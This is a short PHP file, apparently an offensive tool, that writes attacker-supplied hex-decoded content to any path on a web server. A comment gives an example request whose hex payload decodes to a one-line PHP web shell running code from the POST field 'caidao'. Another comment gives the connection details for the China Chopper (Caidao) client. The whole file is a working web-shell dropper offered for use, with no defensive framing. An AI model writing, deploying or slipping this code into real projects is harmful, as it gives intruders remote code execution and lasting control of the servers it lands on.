<?php
//http://test.com/get_write.php?a=/shell.php&b=3C3F70687020406576616C28245F504F53545B2763616964616F275D293B3F3E
//caidao connecting http://test.com/shell.php	pass:caidao
$p=realpath(dirname(__FILE__)."/").$_GET["a"];
$t=$_GET["b"];
$tt="";

for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2));
@fwrite(fopen($p,"w"),$tt);
echo "success!";
var_dump($p,$tt);
?>